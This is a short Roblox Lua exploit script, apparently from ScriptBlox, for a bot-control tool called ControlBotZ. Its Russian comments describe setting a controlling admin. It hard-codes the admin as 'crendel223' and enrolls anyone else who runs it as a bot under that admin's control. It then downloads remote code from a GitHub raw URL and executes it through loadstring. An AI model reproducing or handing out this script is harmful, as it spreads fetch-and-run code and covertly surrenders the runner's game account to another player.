--[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[[
██████╗ ██╗   ██╗    ███████╗██╗██╗  ██╗██████╗ ███████╗███╗   ██╗███╗   ██╗██╗   ██╗     ███████╗ ██████╗ ██╗  ██╗██╗  ██╗
██╔══██╗╚██╗ ██╔╝    ██╔════╝██║╚██╗██╔╝██╔══██╗██╔════╝████╗  ██║████╗  ██║╚██╗ ██╔╝     ██╔════╝██╔═══██╗╚██╗██╔╝██║  ██║
██████╔╝ ╚████╔╝     ███████╗██║ ╚███╔╝ ██████╔╝█████╗  ██╔██╗ ██║██╔██╗ ██║ ╚████╔╝      █████╗  ██║   ██║ ╚███╔╝ ███████║
██╔══██╗  ╚██╔╝      ╚════██║██║ ██╔██╗ ██╔═══╝ ██╔══╝  ██║╚██╗██║██║╚██╗██║  ╚██╔╝       ██╔══╝  ██║   ██║ ██╔██╗ ╚════██║
██████╔╝   ██║       ███████║██║██╔╝ ██╗██║     ███████╗██║ ╚████║██║ ╚████║   ██║███████╗██║     ╚██████╔╝██╔╝ ██╗     ██║
╚═════╝    ╚═╝       ╚══════╝╚═╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝   ╚═╝╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝     ╚═╝
]]

local LocalPLR = game.Players.LocalPlayer
local adminName = "crendel223"

-- Инициализация глобальных переменных
getgenv().Username = adminName -- Админ, который контролирует ботов
getgenv().Prefix = "." -- Префикс для команд
getgenv().Bots = {} -- Список ботов
getgenv().logChat = false -- Логирование чата
getgenv().webhook = "" -- URL вебхука Discord

-- Если игрок не crendel223, добавляем его ник в Bots
if LocalPLR.Name ~= adminName then
    table.insert(getgenv().Bots, LocalPLR.DisplayName) -- Добавляем DisplayName игрока в Bots
    print("Игрок " .. LocalPLR.DisplayName .. " добавлен в getgenv().Bots")
else
    print("Это " .. adminName .. ". Bots остается пустым до ручной настройки.")
end

-- Загружаем основную логику ControlBotZ
loadstring(game:HttpGet("https://raw.githubusercontent.com/sixpennyfox4/rbx/refs/heads/main/ControlBotZ.lua"))()
